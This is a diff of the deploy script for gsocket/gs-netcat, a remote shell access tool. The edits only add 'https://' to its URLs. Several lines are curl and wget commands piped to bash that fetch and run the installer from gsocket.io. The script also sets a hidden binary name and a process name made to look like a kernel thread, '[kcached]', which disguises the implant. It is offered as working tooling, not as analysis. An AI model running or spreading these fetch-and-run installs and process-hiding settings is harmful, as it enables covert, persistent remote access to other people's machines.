@@ -5,14 +5,14 @@
 # See https://www.gsocket.io/deploy/ for examples.
 #
 # This script is typically invoked like this as root or non-root user:
-#   $ bash -c "$(curl -fsSL gsocket.io/x)"
+#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
 #
 # Connect
-#   $ S=MySecret bash -c "$(curl -fsSL goscket.io/x)""
+#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)""
 # Pre-set a secret:
-#   $ X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
+#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
 # Uninstall
-#   $ GS_UNDO=1 bash -c" $(curl -fsSL gsocket.io/x)"
+#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"
 #
 # Other variables:
 # GS_DEBUG=1
@@ -93,8 +93,8 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 unset data
 unset msg
 
-DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
-DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
+DL_CRL="bash -c \"\$(curl -fsSL https://$URL_DEPLOY)\""
+DL_WGT="bash -c \"\$(wget -qO- https://$URL_DEPLOY)\""
 BIN_HIDDEN_NAME_DEFAULT="gs-dbus"
 # Can not use '[kcached/0]'. Bash without bashrc would use "/0] $" as prompt. 
 PROC_HIDDEN_NAME_DEFAULT="[kcached]"
@@ -1515,7 +1515,7 @@ init_vars
 [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
+# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
 if [[ -z $S ]]; then
